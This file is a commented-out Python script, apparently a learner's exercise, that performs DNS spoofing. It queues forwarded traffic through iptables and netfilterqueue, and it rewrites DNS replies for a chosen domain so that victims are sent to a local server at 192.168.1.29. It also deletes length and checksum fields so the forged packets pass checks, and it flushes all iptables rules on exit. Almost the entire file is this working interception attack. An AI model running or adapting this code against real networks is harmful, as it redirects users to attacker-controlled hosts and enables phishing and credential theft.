# #!/usr/bin/env python
# import netfilterqueue
# import os
# import optparse
# import scapy.all as scapy

# parser = optparse.OptionParser()
# parser.add_option('-w', dest='target_website', help="enter the target website's domain name")
# (options, args) = parser.parse_args()

# def process(pkt):
#     # convert pkt to scapy packet
    
#     scapy_pkt = scapy.IP(pkt.get_payload())

#     # check if the packet contains a DNS response
#     if scapy_pkt.haslayer(scapy.DNSRR):
        
#         # check if DNS request exist in the scapy packet as DNS question record would be included in the DNS response
#         if scapy_pkt[scapy.DNSQR].qname:
#             requested_site = scapy_pkt[scapy.DNSQR].qname
            
#             # check if the DNS request contains the domain name entered by the user, if it does, modify the packet 
#             # to redirect the the victim to my loca l server
#             print(requested_site)
#             """
#             requested site returned the following: ???

#                 tlx.3lift.com.
#                 prg.smartadserver.com.
#                 htlb.casalemedia.com.
#                 ads.yieldmo.com.
#                 hbopenbid.pubmatic.com.
#                 htlb.casalemedia.com.
#                 b'ap.lijit.com.'
#                 fastlane.rubiconproject.com.
            
#             """
#             if b'www.vulnweb.com' in requested_site:
                
#                 DNS_answer = scapy.DNSRR(rrname=requested_site, rdata="192.168.1.29")
#                 scapy_pkt[scapy.DNS].an = DNS_answer
#                 scapy_pkt[scapy.DNS].ancount = 1

#                 # deleting the following to prevent data integrity check
#                 del scapy_pkt[scapy.IP].len
#                 del scapy_pkt[scapy.IP].chksum
#                 del scapy_pkt[scapy.UDP].len
#                 del scapy_pkt[scapy.UDP].chksum

#                 print(scapy_pkt.show())

#                 pkt.set_payload(bytes(scapy_pkt))
#                 print(requested_site)

#     pkt.accept()
    
# try:
#     os.system("iptables -I FORWARD -j NFQUEUE --queue-num 0")
#     # os.system("iptables -I INPUT -j NFQUEUE --queue-num 0")
#     # os.system("iptables -I OUTPUT -j NFQUEUE --queue-num 0")
#     nfqueue = netfilterqueue.NetfilterQueue()
#     nfqueue.bind(0, process)
#     nfqueue.run()
# except KeyboardInterrupt:
#     print("Ending DNS Spoofing, clear iptables rules")
#     os.system("iptables --flush")


